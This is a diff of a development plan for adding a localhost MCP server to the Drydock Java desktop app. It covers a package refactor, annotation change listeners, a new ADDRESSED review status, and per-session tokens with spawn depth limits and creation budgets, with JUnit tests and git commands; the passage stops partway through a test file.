@@ -2,28 +2,30 @@
 
 > **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.
 
-**Goal:** Expose Drydock's review annotations, worktree/session creation, and read-only workspace state to the `claude` sessions Drydock spawns, over a localhost MCP server.
+**Goal:** Expose Drydock's review annotations, bounded worktree/session creation, and read-only workspace state to the `claude` sessions Drydock spawns, over a localhost MCP server.
 
-**Architecture:** A new `app.drydock.mcp` package: `McpSessionRegistry` mints one opaque token per `ManagedSessionId` (the token is the whole identity mechanism — no tool takes a repository path); `McpToolRouter` adapts six tools onto existing services through a narrow, JavaFX-free `McpSessionContext` interface; `McpServer` serves streamable-HTTP MCP on `127.0.0.1` from the JDK's `HttpServer`. Per-session config reaches `claude` via a `--mcp-config` file, mirroring how `ClaudeHookInstaller` reaches it via `--settings`.
+**Architecture:** A new `app.drydock.mcp` package. `McpSessionRegistry` mints one opaque token per `ManagedSessionId` and holds its grant and creation budget; `McpToolRouter` adapts six tools onto existing services through a narrow, JavaFX-free `McpSessionContext`; `McpServer` serves streamable-HTTP MCP on `127.0.0.1` from the JDK's `HttpServer`. Per-session config reaches `claude` via `--mcp-config`, mirroring how `ClaudeHookInstaller` reaches it via `--settings`.
 
 **Tech Stack:** Java 26, JavaFX, JUnit 5 (no mocking library — hence the `McpSessionContext` seam), `com.sun.net.httpserver.HttpServer` and `java.net.http.HttpClient` from the JDK, the in-repo `app.drydock.state.json` parser/writer. **No new dependencies.**
 
 **Spec:** `docs/superpowers/specs/2026-07-25-drydock-mcp-server-design.md`
 
+**This plan was revised after adversarial review.** Tasks 1–3 exist because the original plan would not have compiled or would have corrupted annotation data; the spec's "What the adversarial review changed" table maps each finding to its fix. Tasks 1–3 are independently valuable and land no MCP code at all.
+
 ## Global Constraints
 
 - **No new Gradle dependencies.** JSON goes through `app.drydock.state.json.JsonParser` / `JsonWriter`; HTTP through `com.sun.net.httpserver` and `java.net.http`.
-- **The in-repo JSON API is a sealed interface of records**, not a fluent builder: `JsonObject(Map<String, JsonValue>)` with `empty()`, `put`, `get` (returns `null` for an absent key) and `has`; `JsonArray(List<JsonValue>)`; `JsonString(String value)`; `JsonNumber(String literal)` with `of(long)`, `of(double)`, `asInt()`, `asLong()`, `asDouble()`; `JsonBoolean(boolean value)`; `JsonNull.INSTANCE`. `JsonParser.parse(String)` is **static**. There is no `asObject()`/`asString()` accessor and no `JsonValue.of(Map)` — reads are casts, which is why the tests use the `JsonPeek` helper from Task 3.
+- **The in-repo JSON API is a sealed interface of records**, not a fluent builder: `JsonObject(Map<String, JsonValue>)` with `empty()`, `put`, `get` (returns `null` for an absent key) and `has`; `JsonArray(List<JsonValue>)`; `JsonString(String value)`; `JsonNumber(String literal)` with `of(long)`, `of(double)`, `asInt()`, `asLong()`, `asDouble()`; `JsonBoolean(boolean value)`; `JsonNull.INSTANCE`. `JsonParser.parse(String)` is **static**; `JsonWriter.write(JsonValue)` is **static**, pretty-prints with `": "` after keys, and appends a trailing newline. There is no `asObject()`/`asString()` accessor and no `JsonValue.of(Map)` — reads are casts, which is why tests use the `JsonPeek` helper from Task 6.
 - **Never block the JavaFX Application Thread** (AGENTS.md). MCP request handling runs on the server's own executor. Anything needing FX-owned state hops via `Platform.runLater` into a `CompletableFuture` and is awaited **with a timeout**.
 - **All child process spawns go through `ProcessRunner`** or an existing service that already does. No hand-rolled `ProcessBuilder` in `app.drydock.mcp`.
 - **A failed tool never returns an empty success.** Every failure is a distinct, actionable `isError` result.
 - **Never log the port or a session token.**
-- **Create-only.** No tool removes a worktree, closes a session, deletes a branch, or merges.
 - **No tool accepts a repository path argument.** The repository is always derived from the request's session token.
+- **The token is attribution, not isolation.** Any same-uid process can read a sibling session's config file. Do not add security claims that depend on the token being secret.
 - **Remote SSH sessions get no MCP config at all.**
 - **Bind `127.0.0.1` only**, on an ephemeral port (port `0`).
-- **Never inline fully-qualified class names**; use imports (AGENTS.md).
-- Tool names as the agent sees them are `mcp__drydock__<tool>`; the names in `tools/list` are the bare forms (`review_comments`, `review_mark_addressed`, `worktree_create`, `session_start`, `repos_list`, `sessions_list`).
+- **Never inline fully-qualified Java class names**; use imports (AGENTS.md). This applies to the test code in this plan too.
+- Tool names as the agent sees them are `mcp__drydock__<tool>`; the names in `tools/list` are the bare forms (`review_comments`, `review_reply`, `worktree_create`, `session_start`, `repos_list`, `sessions_list`).
 
 ## File Structure
 
@@ -31,45 +33,441 @@
 
 | File | Responsibility |
 |---|---|
-| `app/src/main/java/app/drydock/mcp/McpSessionRegistry.java` | Mint / resolve / revoke per-session tokens. No other state. |
-| `app/src/main/java/app/drydock/mcp/AnnotationLines.java` | Decode `n<line>` / `o<line>` stable keys into a line number plus a deleted flag. |
-| `app/src/main/java/app/drydock/mcp/McpSessionContext.java` | The JavaFX-free interface the router depends on: token → repo/worktree/annotations/session list, plus "start a session". |
+| `app/src/main/java/app/drydock/git/WorktreeNaming.java` | *Moved* from `app.drydock.ui`, made public. Worktree directory naming. |
+| `app/src/main/java/app/drydock/mcp/McpSessionRegistry.java` | Tokens, grants, and creation budgets per session. |
+| `app/src/main/java/app/drydock/mcp/AnnotationLines.java` | Decode `n<line>` / `o<line>` stable keys. |
+| `app/src/main/java/app/drydock/mcp/McpSessionContext.java` | The JavaFX-free interface the router depends on. |
 | `app/src/main/java/app/drydock/mcp/McpToolRouter.java` | The six tools. Thin adapters; no domain logic. |
 | `app/src/main/java/app/drydock/mcp/McpToolException.java` | Checked failure carrying the actionable `isError` message. |
+| `app/src/main/java/app/drydock/mcp/BranchNames.java` | Branch-name validation (remote shadowing, `refs/`, ref-format). |
+| `app/src/main/java/app/drydock/mcp/PromptSafety.java` | Reject prompts that reach the TUI as commands rather than text. |
 | `app/src/main/java/app/drydock/mcp/McpServer.java` | HTTP transport, JSON-RPC framing, token auth, `Origin`/`Host` validation. |
-| `app/src/main/java/app/drydock/mcp/McpConfigWriter.java` | Write the per-session `--mcp-config` JSON file; delete it on revoke. |
-| `app/src/main/java/app/drydock/mcp/WorkspaceMcpSessionContext.java` | The production `McpSessionContext`, bridging to `SessionManager` / `MainWorkspace` on the FX thread. |
+| `app/src/main/java/app/drydock/mcp/McpConfigWriter.java` | Per-session `--mcp-config` file. |
+| `app/src/main/java/app/drydock/mcp/WorkspaceMcpSessionContext.java` | Production `McpSessionContext`. |
 
 **Modified:**
 
 | File | Change |
 |---|---|
+| `app/src/main/java/app/drydock/review/AnnotationStore.java` | Change listener fired on add/update/remove. |
+| `app/src/main/java/app/drydock/ui/review/ReviewView.java` | Subscribe to the store; card handlers re-read by id; handle `ADDRESSED` in the status switch, summary, and toggle. |
 | `app/src/main/java/app/drydock/review/AnnotationStatus.java` | Add `ADDRESSED`. |
-| `app/src/main/java/app/drydock/ui/review/*` (the annotation list/gutter renderer) | Render `ADDRESSED` distinctly; add the human `ADDRESSED → RESOLVED` action. |
+| `app/src/main/resources/app/drydock/ui/app.css` | `.status-addressed` and `.thread-addressed`. |
+| `app/src/main/java/app/drydock/ui/NewWorktreeModal.java` | Import `WorktreeNaming` from its new package. |
 | `app/src/main/java/app/drydock/claude/ClaudeCapabilities.java` | Add `supportsMcpConfig`. |
 | `app/src/main/java/app/drydock/claude/ClaudeCapabilityService.java` | Detect `--mcp-config`. |
-| `app/src/main/java/app/drydock/app/SessionManager.java` | Add `--mcp-config <file>` to the local create/resume commands. |
-| `app/src/main/java/app/drydock/DrydockApplication.java` | Start/stop `McpServer`; wire the context; revoke tokens on session close. |
-| `docs/manual-terminal-checklist.md` | The end-to-end "claude actually calls a tool" check. |
-| `README.md` | Feature bullet. |
+| `app/src/main/java/app/drydock/app/SessionManager.java` | `--mcp-config <file>` on the local create/resume commands (**three** call sites). |
+| `app/src/main/java/app/drydock/ui/MainWorkspace.java` | New API returning the started session's id. |
+| `app/src/main/java/app/drydock/DrydockApplication.java` | Start/stop `McpServer`; wire the context; revoke on session close. |
+| `buildSrc/src/main/kotlin/drydock/tasks/RuntimeImageTask.kt` | Add `jdk.httpserver` to `--add-modules`. |
+| `app/src/test/java/app/drydock/app/SessionManagerTest.java` | 14 `buildCreateCommand`/`buildResumeCommand` calls gain a trailing argument; `caps(...)` gains a component. |
+| `docs/manual-terminal-checklist.md`, `README.md` | Manual gate; feature bullet. |
 
-Tasks 1–6 are pure/headless and land behind no UI. The server is not reachable by any `claude` session until Task 8, so partial completion is safe.
+Tasks 1–3 touch no MCP code. Tasks 4–11 are headless and unreachable by any session. Task 12 turns it on. Stopping after Task 7 yields a working review loop with no fan-out.
 
 ---
 
-### Task 1: `McpSessionRegistry`
+### Task 1: Move `WorktreeNaming` out of the UI package
+
+**Files:**
+- Create: `app/src/main/java/app/drydock/git/WorktreeNaming.java`
+- Delete: `app/src/main/java/app/drydock/ui/WorktreeNaming.java`
+- Modify: `app/src/main/java/app/drydock/ui/NewWorktreeModal.java`
+- Move: `app/src/test/java/app/drydock/ui/WorktreeNamingTest.java` → `app/src/test/java/app/drydock/git/WorktreeNamingTest.java` (if it exists; check with `ls app/src/test/java/app/drydock/ui/`)
+
+**Why:** `final class WorktreeNaming` at `app/src/main/java/app/drydock/ui/WorktreeNaming.java:12` is package-private, and so are `slug` (line 24) and both `defaultDirectory` overloads (lines 37, 47). `app.drydock.mcp` cannot reference it. Leaving it in `app.drydock.ui` and widening it would make the router depend on the UI package, inverting the layering of a component the spec advertises as JavaFX-free. `app.drydock.git` already owns worktree concepts.
+
+**Interfaces:**
+- Produces: `public final class app.drydock.git.WorktreeNaming` with `public static String slug(String branch)`, `public static Path defaultDirectory(Path home, String repositoryName, String branch)`, `public static Path defaultDirectory(Path home, Optional<Path> worktreesDirectory, String repositoryName, String branch)`.
+
+- [ ] **Step 1: Move the file with git so history follows**
+
+```bash
+git mv app/src/main/java/app/drydock/ui/WorktreeNaming.java \
+       app/src/main/java/app/drydock/git/WorktreeNaming.java
+ls app/src/test/java/app/drydock/ui/ | grep -i worktreenaming
+```
+
+If a test file was listed, move it too:
+
+```bash
+git mv app/src/test/java/app/drydock/ui/WorktreeNamingTest.java \
+       app/src/test/java/app/drydock/git/WorktreeNamingTest.java
+```
+
+- [ ] **Step 2: Change the package and widen visibility**
+
+In `app/src/main/java/app/drydock/git/WorktreeNaming.java`: change `package app.drydock.ui;` to `package app.drydock.git;`, change `final class WorktreeNaming` to `public final class WorktreeNaming`, and add `public` to `slug` and both `defaultDirectory` overloads. Leave the private constructor and all logic untouched. Apply the same package change to the moved test, if there was one.
+
+- [ ] **Step 3: Fix the callers**
+
+```bash
+grep -rn "WorktreeNaming" app/src/main/java app/src/test/java
+```
+
+Every hit outside `app/src/main/java/app/drydock/git/` needs `import app.drydock.git.WorktreeNaming;`. `NewWorktreeModal.java` (around lines 125–133) is the main one.
+
+- [ ] **Step 4: Verify nothing else broke**
+
+Run: `./gradlew :app:test`
+Expected: PASS. This task changes no behavior, so any failure is a missed import.
+
+- [ ] **Step 5: Commit**
+
+```bash
+git add -A app/src/main/java/app/drydock app/src/test/java/app/drydock
+git commit -m "refactor: move WorktreeNaming from ui to git and make it public"
+```
+
+---
+
+### Task 2: Annotation change notification
+
+**Files:**
+- Modify: `app/src/main/java/app/drydock/review/AnnotationStore.java`
+- Modify: `app/src/main/java/app/drydock/ui/review/ReviewView.java`
+- Test: `app/src/test/java/app/drydock/review/AnnotationStoreTest.java` (extend)
+
+**Why this is a prerequisite, not a nicety.** `AnnotationStore` has no observer API (verified: no `listener`/`Consumer` anywhere in the file), and its Javadoc names the Review tab as its mutator. `ReviewView` caches built cards in `cardNodes` keyed by id (`ReviewView.java:159`, `:848`), and the card handlers capture the `ReviewAnnotation` **value** they were built from — the toggle at `:866-875` computes `annotation.withStatus(...)` from the captured value.
+
+So once anything else writes to the store, a human clicking Resolve on a card built before that write calls `staleAnnotation.withStatus(RESOLVED)` and `annotationStore.update(...)` — **silently discarding the other writer's status and thread messages**. That is the read-modify-write hazard AGENTS.md's "One writer for persistent state" section records as a past data-loss bug. `synchronized` methods do not help: they protect the list, not a caller holding a stale value.
+
+**Interfaces:**
+- Produces:
+  - `Runnable AnnotationStore.addChangeListener(Consumer<String> listener)` — returns an unsubscribe handle; the `String` is the changed annotation's id, or `null` for a bulk change.
+  - No signature change to `add`/`update`/`remove`/`removeSession`.
+
+- [ ] **Step 1: Write the failing test**
+
+Append to `app/src/test/java/app/drydock/review/AnnotationStoreTest.java`, matching the fixture style already in that file:
+
+```java
+    @Test
+    void changeListenerFiresOnAddUpdateAndRemove(@TempDir Path dir) throws Exception {
+        try (AnnotationStore store = new AnnotationStore(dir.resolve("annotations.json"))) {
+            List<String> events = new ArrayList<>();
+            store.addChangeListener(events::add);
+
+            ReviewAnnotation annotation = ReviewAnnotation.create(ManagedSessionId.newId(), DiffScope.BASE,
+                    "src/Main.java", "n1", "n1",
+                    new ReviewAnnotation.Message("You", Instant.EPOCH, "look here"));
+
+            store.add(annotation);
+            store.update(annotation.withStatus(AnnotationStatus.SENT));
+            store.remove(annotation.id());
+
+            assertEquals(List.of(annotation.id(), annotation.id(), annotation.id()), events);
+        }
+    }
+
+    @Test
+    void removingASessionFiresOneBulkChange(@TempDir Path dir) throws Exception {
+        try (AnnotationStore store = new AnnotationStore(dir.resolve("annotations.json"))) {
+            ManagedSessionId session = ManagedSessionId.newId();
+            store.add(ReviewAnnotation.create(session, DiffScope.BASE, "a.java", "n1", "n1",
+                    new ReviewAnnotation.Message("You", Instant.EPOCH, "one")));
+            store.add(ReviewAnnotation.create(session, DiffScope.BASE, "b.java", "n2", "n2",
+                    new ReviewAnnotation.Message("You", Instant.EPOCH, "two")));
+
+            List<String> events = new ArrayList<>();
+            store.addChangeListener(events::add);
+            store.removeSession(session);
+
+            assertEquals(1, events.size());
+            assertNull(events.get(0), "a bulk change reports a null id");
+        }
+    }
+
+    @Test
+    void unsubscribingStopsDelivery(@TempDir Path dir) throws Exception {
+        try (AnnotationStore store = new AnnotationStore(dir.resolve("annotations.json"))) {
+            List<String> events = new ArrayList<>();
+            Runnable unsubscribe = store.addChangeListener(events::add);
+            unsubscribe.run();
+
+            store.add(ReviewAnnotation.create(ManagedSessionId.newId(), DiffScope.BASE, "a.java", "n1", "n1",
+                    new ReviewAnnotation.Message("You", Instant.EPOCH, "one")));
+
+            assertTrue(events.isEmpty());
+        }
+    }
+
+    @Test
+    void aThrowingListenerDoesNotBreakTheWrite(@TempDir Path dir) throws Exception {
+        try (AnnotationStore store = new AnnotationStore(dir.resolve("annotations.json"))) {
+            store.addChangeListener(id -> {
+                throw new IllegalStateException("listener blew up");
+            });
+
+            ReviewAnnotation annotation = ReviewAnnotation.create(ManagedSessionId.newId(), DiffScope.BASE,
+                    "a.java", "n1", "n1", new ReviewAnnotation.Message("You", Instant.EPOCH, "one"));
+            store.add(annotation);
+
+            assertTrue(store.byId(annotation.id()).isPresent(), "the write must survive a bad listener");
+        }
+    }
+```
+
+Add whatever imports the file lacks: `java.util.ArrayList`, `java.util.List`, `java.time.Instant`, `org.junit.jupiter.api.io.TempDir`, `assertNull`, `assertTrue`.
+
+- [ ] **Step 2: Run tests to verify they fail**
+
+Run: `./gradlew :app:test --tests 'app.drydock.review.AnnotationStoreTest'`
+Expected: FAIL — `addChangeListener` does not exist.
+
+- [ ] **Step 3: Add the listener to `AnnotationStore`**
+
+Add the field and registration:
+
+```java
+    /**
+     * Change listeners, notified after every mutation with the affected
+     * annotation's id (or {@code null} for a bulk change).
+     *
+     * <p>Exists because this store now has more than one writer: the Review
+     * tab on the FX thread, and the MCP tool router on its own executor. A
+     * view that caches annotation values must be told to re-read them, or a
+     * later read-modify-write from the stale value silently discards the
+     * other writer's change (AGENTS.md, "One writer for persistent state").</p>
+     */
+    private final List<Consumer<String>> changeListeners = new CopyOnWriteArrayList<>();
+
+    /** Registers a listener; returns a handle that unregisters it. */
+    public Runnable addChangeListener(Consumer<String> listener) {
+        Objects.requireNonNull(listener, "listener");
+        changeListeners.add(listener);
+        return () -> changeListeners.remove(listener);
+    }
+
+    /**
+     * Fires listeners outside this object's monitor. A listener that throws is
+     * logged and skipped: notification is cosmetic next to the write that just
+     * succeeded, and one bad subscriber must not fail the others.
+     */
+    private void fireChanged(String annotationId) {
+        for (Consumer<String> listener : changeListeners) {
+            try {
+                listener.accept(annotationId);
+            } catch (RuntimeException e) {
+                LOG.log(Level.WARNING, "Annotation change listener failed: " + e);
+            }
+        }
+    }
+```
+
+Then call `fireChanged(...)` at the end of `add`, `update`, and `remove` (passing the annotation id) and of `removeSession` (passing `null`). **Call it after the `synchronized` block, not inside it** — a listener that re-enters the store from the FX thread would otherwise deadlock against a concurrent MCP write. If the existing methods are `synchronized` on the method signature, extract the body into a private `synchronized` helper and fire afterwards.
+
+Confirm the file already has a `LOG` and imports for `Consumer`, `CopyOnWriteArrayList`, and `Level`; add what is missing.
+
+- [ ] **Step 4: Run tests to verify they pass**
+
+Run: `./gradlew :app:test --tests 'app.drydock.review.AnnotationStoreTest'`
+Expected: PASS
+
+- [ ] **Step 5: Make `ReviewView` re-read from the store**
+
+Two changes in `app/src/main/java/app/drydock/ui/review/ReviewView.java`:
+
+1. **Card handlers must re-read by id.** The toggle at `:866-875` and the reply handler at around `:904-913` both start from the captured `annotation`. Change each to fetch current state first, and skip if the annotation is gone:
+
+```java
+        toggle.setOnAction(e -> {
+            // Re-read: another writer (the MCP tool router) may have changed
+            // this thread since this card was built, and computing from the
+            // captured value would discard their change.
+            ReviewAnnotation current = annotationStore.byId(annotation.id()).orElse(null);
+            if (current == null) {
+                return;
+            }
+            ReviewAnnotation updated = current.withStatus(
+                    current.status() == AnnotationStatus.OPEN ? AnnotationStatus.RESOLVED : AnnotationStatus.OPEN);
+            annotationStore.update(updated);
+            replaceCardRow(updated);
+            updateSummary();
+        });
+```
+
+2. **Subscribe to the store.** Register a listener that, on the FX thread, evicts the affected card from `cardNodes` and rebuilds the row (`replaceCardRow`) plus `updateSummary()`; a `null` id means rebuild everything. Use `Platform.runLater` — the notification can arrive on the MCP executor. Store the unsubscribe handle and call it wherever this view is disposed, so a discarded view stops receiving events (AGENTS.md: lifecycle symmetry).
+
+- [ ] **Step 6: Verify the app still behaves**
+
+Run: `./gradlew :app:test`
+Expected: PASS
+
+Run: `./gradlew :app:run`
+Expected: open a repo with changes, open the Review tab, add an annotation, resolve it, reply to it. All still work, and no exception appears in the log.
+
+- [ ] **Step 7: Commit**
+
+```bash
+git add app/src/main/java/app/drydock/review/AnnotationStore.java \
+        app/src/main/java/app/drydock/ui/review/ReviewView.java \
+        app/src/test/java/app/drydock/review/AnnotationStoreTest.java
+git commit -m "fix(review): notify on annotation changes and re-read before write"
+```
+
+---
+
+### Task 3: `AnnotationStatus.ADDRESSED`, end to end in the UI
+
+**Files:**
+- Modify: `app/src/main/java/app/drydock/review/AnnotationStatus.java`
+- Modify: `app/src/main/java/app/drydock/ui/review/ReviewView.java`
+- Modify: `app/src/main/resources/app/drydock/ui/app.css`
+- Test: `app/src/test/java/app/drydock/review/AnnotationStatusTest.java`
+
+**Why all of it in one task.** `ReviewView.java:858` is an exhaustive `switch` **expression** over `AnnotationStatus` with no `default`:
+
+```java
+        status.getStyleClass().addAll("review-status-pill", switch (annotation.status()) {
+            case OPEN -> "status-open";
+            case SENT -> "status-sent";
+            case RESOLVED -> "status-resolved";
+            case FIXED -> "status-fixed";
+        });
+```
+
+Adding the constant without the arm is a compile error, so this cannot be split across tasks. Two more places need it or the status is invisible: `updateSummary` (`:927-934`) counts only `OPEN` and `SENT`, and the toggle (`:865`) is `status == OPEN ? "Resolve" : "Reopen"`, which would force a human to Reopen an `ADDRESSED` thread before they could resolve it.
+
+**Interfaces:**
+- Produces: `AnnotationStatus.ADDRESSED`, ordered after `SENT` and before `RESOLVED`.
+
+- [ ] **Step 1: Write the failing test**
+
+Create `app/src/test/java/app/drydock/review/AnnotationStatusTest.java`:
+
+```java
+package app.drydock.review;
+
+import org.junit.jupiter.api.Test;
+
+import static org.junit.jupiter.api.Assertions.assertEquals;
+
+class AnnotationStatusTest {
+
+    @Test
+    void addressedRoundTripsThroughPersistence() {
+        assertEquals(AnnotationStatus.ADDRESSED,
+                AnnotationStatus.fromPersisted(AnnotationStatus.ADDRESSED.name()));
+    }
+
+    @Test
+    void unknownStatusStillDecodesLenientToOpen() {
+        // An older build reading a newer state file must see an ADDRESSED
+        // thread as OPEN -- reappearing as open is safe; silently reading
+        // as resolved is not.
+        assertEquals(AnnotationStatus.OPEN, AnnotationStatus.fromPersisted("SOMETHING_NEWER"));
+    }
+
+    @Test
+    void legacyFixedStillDecodes() {
+        assertEquals(AnnotationStatus.FIXED, AnnotationStatus.fromPersisted("fixed"));
+    }
+}
+```
+
+- [ ] **Step 2: Run test to verify it fails**
+
+Run: `./gradlew :app:test --tests 'app.drydock.review.AnnotationStatusTest'`
+Expected: FAIL — `ADDRESSED` does not exist.
+
+- [ ] **Step 3: Add the constant**
+
+In `AnnotationStatus.java`, the constant list becomes:
+
+```java
+    OPEN,
+    SENT,
+    ADDRESSED,
+    RESOLVED,
+    FIXED;
+```
+
+Add this paragraph to the class Javadoc, after the sentence about `FIXED`:
+
+```java
+ * <p>{@link #ADDRESSED} is claimed by the agent itself through the MCP tool
+ * {@code review_reply} -- distinct from {@link #RESOLVED}, which only the
+ * human sets. This is the case {@link #FIXED} got wrong: that value was the
+ * <em>app</em> inferring a fix from a successful hand-off, which it cannot
+ * know. An agent reporting its own work can -- though the report is a claim,
+ * not evidence, so the human still confirms and the thread note matters more
+ * than the status.</p>
+```
+
+- [ ] **Step 4: Handle it in `ReviewView`**
+
+Three edits:
+
+1. The status switch at `:858` gains `case ADDRESSED -> "status-addressed";`.
+2. `updateSummary()` (`:927-934`) counts addressed threads and shows them. Replace the body's counting and label with:
+
+```java
+        long open = annotations.stream().filter(a -> a.status() == AnnotationStatus.OPEN).count();
+        long sent = annotations.stream().filter(a -> a.status() == AnnotationStatus.SENT).count();
+        long addressed = annotations.stream().filter(a -> a.status() == AnnotationStatus.ADDRESSED).count();
+        summaryLabel.setText(open + " open · " + annotations.size()
+                + (annotations.size() == 1 ? " annotation" : " annotations")
+                + " · " + sent + " sent" + (addressed > 0 ? " · " + addressed + " addressed" : ""));
+        sendButton.setDisable(open == 0);
+```
+
+3. The toggle at `:865` must offer "Resolve" for an `ADDRESSED` thread, not "Reopen". Replace the label and the action's target status:
+
+```java
+        boolean resolvable = annotation.status() == AnnotationStatus.OPEN
+                || annotation.status() == AnnotationStatus.SENT
+                || annotation.status() == AnnotationStatus.ADDRESSED;
+        Button toggle = new Button(resolvable ? "Resolve" : "Reopen");
+```
+
+and inside the handler (which Task 2 already changed to re-read `current`), pick the target from `current.status()` using the same `resolvable` test rather than from the captured value.
+
+- [ ] **Step 5: Add the styles**
+
+In `app/src/main/resources/app/drydock/ui/app.css`, next to the existing `.status-sent` / `.status-fixed` and `.review-thread-card.thread-fixed` rules (around line 1866), add `.status-addressed` and `.review-thread-card.thread-addressed`. Make `ADDRESSED` visually distinct from `RESOLVED` — it is an agent's claim, not the human's verdict. Label the pill through the existing lowercase-name mechanism; no inline styles.
+
+- [ ] **Step 6: Verify**
+
+Run: `./gradlew :app:test`
+Expected: PASS
+
+Run: `./gradlew :app:run`
+Expected: existing annotation flows still work; the Review tab renders.
+
+- [ ] **Step 7: Commit**
+
+```bash
+git add app/src/main/java/app/drydock/review/AnnotationStatus.java \
+        app/src/main/java/app/drydock/ui/review/ReviewView.java \
+        app/src/main/resources/app/drydock/ui/app.css \
+        app/src/test/java/app/drydock/review/AnnotationStatusTest.java
+git commit -m "feat(review): add ADDRESSED status with full Review-view handling"
+```
+
+---
+
+### Task 4: `McpSessionRegistry` with grants and budgets
 
 **Files:**
 - Create: `app/src/main/java/app/drydock/mcp/McpSessionRegistry.java`
 - Test: `app/src/test/java/app/drydock/mcp/McpSessionRegistryTest.java`
 
+**Why grants.** A session started by `session_start` is itself a local session, so it would get its own token and could spawn again. Unbounded, one instruction becomes 13 `claude` processes and 12 worktrees, all costing tokens, none removable through MCP by design. The registry enforces depth 1 (an agent-started session may not spawn) and a per-session creation budget.
+
 **Interfaces:**
-- Consumes: `app.drydock.domain.ManagedSessionId` (existing record wrapping a `UUID`).
+- Consumes: `app.drydock.domain.ManagedSessionId`.
 - Produces:
-  - `String McpSessionRegistry.mint(ManagedSessionId)` — returns the token.
-  - `Optional<ManagedSessionId> McpSessionRegistry.resolve(String token)`
-  - `void McpSessionRegistry.revoke(ManagedSessionId)`
-  - `Optional<String> McpSessionRegistry.tokenFor(ManagedSessionId)`
+  - `enum McpSessionRegistry.Spawn { ALLOWED, FORBIDDEN }`
+  - `String mint(ManagedSessionId, Spawn)`
+  - `Optional<ManagedSessionId> resolve(String token)`
+  - `Optional<String> tokenFor(ManagedSessionId)`
+  - `boolean maySpawn(ManagedSessionId)`
+  - `void chargeWorktree(ManagedSessionId) throws McpBudgetExhaustedException`
+  - `void chargeSession(ManagedSessionId) throws McpBudgetExhaustedException`
+  - `void revoke(ManagedSessionId)`
+  - `static final int MAX_WORKTREES_PER_SESSION = 4`, `MAX_SESSIONS_PER_SESSION = 4`
+  - `class McpBudgetExhaustedException extends Exception` (nested or its own file; the router turns it into an `McpToolException`)
 
 - [ ] **Step 1: Write the failing test**
 
@@ -79,6 +477,7 @@ Create `app/src/test/java/app/drydock/mcp/McpSessionRegistryTest.java`:
 package app.drydock.mcp;
 
 import app.drydock.domain.ManagedSessionId;
+import app.drydock.mcp.McpSessionRegistry.Spawn;
 import org.junit.jupiter.api.Test;
 
 import java.util.Optional;
@@ -86,6 +485,7 @@ import java.util.Optional;
 import static org.junit.jupiter.api.Assertions.assertEquals;
 import static org.junit.jupiter.api.Assertions.assertFalse;
 import static org.junit.jupiter.api.Assertions.assertNotEquals;
+import static org.junit.jupiter.api.Assertions.assertThrows;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 
 class McpSessionRegistryTest {
@@ -96,29 +496,27 @@ class McpSessionRegistryTest {
     void mintedTokenResolvesBackToItsSession() {
         ManagedSessionId session = ManagedSessionId.newId();
 
-        String token = registry.mint(session);
+        String token = registry.mint(session, Spawn.ALLOWED);
 
         assertEquals(Optional.of(session), registry.resolve(token));
     }
 
     @Test
     void distinctSessionsGetDistinctTokens() {
-        String first = registry.mint(ManagedSessionId.newId());
-        String second = registry.mint(ManagedSessionId.newId());
-
-        assertNotEquals(first, second);
+        assertNotEquals(registry.mint(ManagedSessionId.newId(), Spawn.ALLOWED),
+                registry.mint(ManagedSessionId.newId(), Spawn.ALLOWED));
     }
 
     @Test
     void mintingTwiceForOneSessionReusesTheSameToken() {
         ManagedSessionId session = ManagedSessionId.newId();
 
-        assertEquals(registry.mint(session), registry.mint(session));
+        assertEquals(registry.mint(session, Spawn.ALLOWED), registry.mint(session, Spawn.ALLOWED));
     }
 
     @Test
     void unknownTokenDoesNotResolve() {
-        registry.mint(ManagedSessionId.newId());
+        registry.mint(ManagedSessionId.newId(), Spawn.ALLOWED);
 
         assertTrue(registry.resolve("not-a-real-token").isEmpty());
     }
@@ -126,7 +524,7 @@ class McpSessionRegistryTest {
     @Test
     void revokedTokenStopsResolving() {
         ManagedSessionId session = ManagedSessionId.newId();
-        String token = registry.mint(session);
+        String token = registry.mint(session, Spawn.ALLOWED);
 
         registry.revoke(session);
 
@@ -141,10 +539,87 @@ class McpSessionRegistryTest {
 
     @Test
     void tokenIsLongEnoughToResistGuessing() {
-        String token = registry.mint(ManagedSessionId.newId());
+        String token = registry.mint(ManagedSessionId.newId(), Spawn.ALLOWED);
 
         assertTrue(token.length() >= 32, "token too short: " + token.length());
         assertFalse(token.contains("="), "token must be URL-safe and unpadded");
+    }
+
+    @Test
+    void anAgentStartedSessionMayNotSpawn() {
+        ManagedSessionId child = ManagedSessionId.newId();
+        registry.mint(child, Spawn.FORBIDDEN);
+
+        assertFalse(registry.maySpawn(child));
+    }
+
+    @Test
+    void aHumanStartedSessionMaySpawn() {
+        ManagedSessionId session = ManagedSessionId.newId();
+        registry.mint(session, Spawn.ALLOWED);
+
+        assertTrue(registry.maySpawn(session));
+    }
+
+    @Test
+    void anUnknownSessionMayNotSpawn() {
+        assertFalse(registry.maySpawn(ManagedSessionId.newId()));
+    }
+
+    @Test
+    void worktreeBudgetIsExhaustedAfterTheLimit() throws Exception {
+        ManagedSessionId session = ManagedSessionId.newId();
+        registry.mint(session, Spawn.ALLOWED);
+
+        for (int i = 0; i < McpSessionRegistry.MAX_WORKTREES_PER_SESSION; i++) {
+            registry.chargeWorktree(session);
+        }
+
+        McpBudgetExhaustedException failure =
+                assertThrows(McpBudgetExhaustedException.class, () -> registry.chargeWorktree(session));
+        assertTrue(failure.getMessage().contains(String.valueOf(McpSessionRegistry.MAX_WORKTREES_PER_SESSION)),
+                "the message must name the limit: " + failure.getMessage());
+    }
+
+    @Test
+    void sessionBudgetIsExhaustedAfterTheLimit() throws Exception {
+        ManagedSessionId session = ManagedSessionId.newId();
+        registry.mint(session, Spawn.ALLOWED);
+
+        for (int i = 0; i < McpSessionRegistry.MAX_SESSIONS_PER_SESSION; i++) {
+            registry.chargeSession(session);
+        }
+
+        assertThrows(McpBudgetExhaustedException.class, () -> registry.chargeSession(session));
+    }
+
+    @Test
+    void theTwoBudgetsAreIndependent() throws Exception {
+        ManagedSessionId session = ManagedSessionId.newId();
+        registry.mint(session, Spawn.ALLOWED);
+
+        for (int i = 0; i < McpSessionRegistry.MAX_WORKTREES_PER_SESSION; i++) {
+            registry.chargeWorktree(session);
+        }
+
+        registry.chargeSession(session);
+    }
+
+    @Test
